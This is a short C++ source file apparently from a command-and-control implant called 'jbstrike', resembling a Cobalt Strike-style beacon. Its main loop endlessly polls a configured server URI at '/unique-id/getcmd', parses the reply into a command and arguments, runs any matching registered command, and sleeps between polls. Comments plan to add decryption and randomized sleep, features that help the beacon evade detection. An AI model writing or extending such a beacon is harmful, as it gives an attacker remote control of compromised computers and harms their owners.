#include "Application.h"


jbstrike::Application::Application() {}


void jbstrike::Application::Run() {

	while(TRUE) {
		std::string data = http.Get(cfg.UriString, "/unique-id/getcmd");
		jbstrike::ReceivedCmd ParsedCommand = ParseData(data);

		// @TODO Threads.
		if (Commands.Has(ParsedCommand.Command)) {

			Commands.Run(ParsedCommand.Command, ParsedCommand.Args);

		}else {
			//http.Post("/output", "undefined function");
		}

		Sleep(cfg.SleepTime);// @todo add randomization
	}

}


jbstrike::ReceivedCmd jbstrike::Application::ParseData(std::string data) {
	jbstrike::ReceivedCmd result;
	
	std::vector<std::string> tmp;

	if (data == "") {
		result.Command = "undefined";
		
		return result;
	}// Decryption here.

	tmp = jbstrike::split(data);

	result.Command = tmp.front();
	tmp.erase(tmp.begin());

	result.Args = tmp;
	result.NumberOfArguments = tmp.size();

	tmp.clear();
	tmp.shrink_to_fit();

	return result;
}